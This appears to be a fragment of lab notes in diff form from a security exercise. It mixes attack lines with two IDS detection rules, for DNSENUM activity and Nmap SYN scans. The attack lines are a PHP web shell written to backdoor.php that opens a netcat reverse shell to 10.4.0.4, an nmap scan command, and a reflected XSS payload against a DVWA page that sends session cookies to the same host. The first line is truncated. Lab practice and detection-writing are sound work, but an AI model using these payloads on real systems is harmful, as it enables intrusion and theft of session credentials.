@@ -1,0 +1,10 @@
+?php shell_exec('nc 10.4.0.4 8888 -e /bin/sh'); ?>""" > backdoor.php
+
+alert udp any any -> any 53 (msg:"Generic DNSENUM Tool Activity Detected"; content:"|01 00 00 01 00 00 00 00 00 00|"; offset:2; pcre:"/\x0c[a-z]{12}[\x01-\x3f]/"; content:"|00 01 00 01|"; distance:1; sid:1000003; rev:1;)
+
+nmap -sS -sV -p80,443 172.16.18.28
+
+alert tcp any any -> 172.16.18.28 80,443 (msg:"SCAN Nmap SYN Stealth Scan Detected"; flags:S; flow:stateless; detection_filter:track by_src,count 5,seconds 2; classtype:attempted-recon; sid:6001001; rev:1;)
+
+
+http://dvwa.wj.com/vulnerabilities/xss_r/?name=<script>document.location='http://10.4.0.4:8080/?c='+document.cookie</script>
